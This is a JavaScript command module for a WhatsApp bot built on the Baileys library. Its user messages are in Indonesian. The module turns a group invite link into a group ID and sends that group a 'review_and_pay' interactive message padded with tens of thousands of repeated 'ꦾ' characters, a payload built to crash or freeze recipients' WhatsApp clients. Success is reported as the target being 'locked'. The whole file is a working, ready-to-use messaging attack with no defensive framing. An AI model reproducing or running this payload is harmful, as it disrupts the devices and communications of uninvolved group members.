const { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");
const chalk = require('chalk');
 
async function PayBlank(sock, target) {
  const msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      interactiveMessage: {
        header: {
          title: "",
          hasMediaAttachment: false
        },
        body: {
          text: ""
        },
        footer: {
          text: "ꦾ".repeat(100000)
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "review_and_pay",
              buttonParamsJson: JSON.stringify({
                currency: "IDR",
                total_amount: {
                  value: 0,
                  offset: 100
                },
                reference_id: "ꦾ".repeat(100000),
                type: "physical-goods",
                order: {
                  status: "payment_requested",
                  subtotal: {
                    value: 0,
                    offset: 100
                  },
                  order_type: "ORDER",
                  items: [
                    {
                      name: "ꦾ".repeat(60000),
                      amount: {
                        value: 0,
                        offset: 100
                      },
                      quantity: 9999
                    }
                  ]
                }
              })
            }
          ]
        }
      }
    }),
    {}
  );

  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

module.exports = {
    command: ['grup'],  
    isOwner: false, 
    isPremium: false,
    run: async (sock, m, { prefix, command, text, isPremium, isOwner }) => {
        try {
            if (!isOwner && !isPremium) {
                return m.reply('*[ AKSES DITOLAK ]* Fitur ini dikunci khusus pengguna Premium / Owner!');
            }
            if (!text) {
                return m.reply(`Contoh Penggunaan:\n${prefix}${command} https://chat.whatsapp.com/xxxxx`);
            }
            let groupRegex = /chat\.whatsapp\.com\/([0-9A-Za-z]{20,24})/i;
            let isGroupLink = text.match(groupRegex);            
            if (!isGroupLink) {
                return m.reply("Teks yang Anda masukkan bukan link grup WhatsApp yang valid!");
            }           
            let inviteCode = isGroupLink[1]; 
            let target; 
            await sock.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
            m.reply(`Sedang mengambil data grup...`);
            try {
                let infoGrup = await sock.groupGetInviteInfo(inviteCode);
                target = infoGrup.id;  
                if (!target) return m.reply("Gagal mendapatkan ID Grup.");
            } catch (err) {
                console.error(err);
                await sock.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                return m.reply("Gagal memproses link grup. Pastikan link aktif atau bot tidak di-ban dari grup tersebut.");
            }

            for (let i = 0; i < 1; i++) {
                await PayBlank(sock, target);
            }
            console.log(chalk.red.bold(`✅ Success! "${command}" sent to ${target}`));
            m.reply(`*Target Sukses Dilock:* ${target}`);
            await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

        } catch (error) {
            console.error(error);
            m.reply(`❌ Terjadi kesalahan mendadak saat mengeksekusi perintah.`);
            await sock.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
        }
    }
};
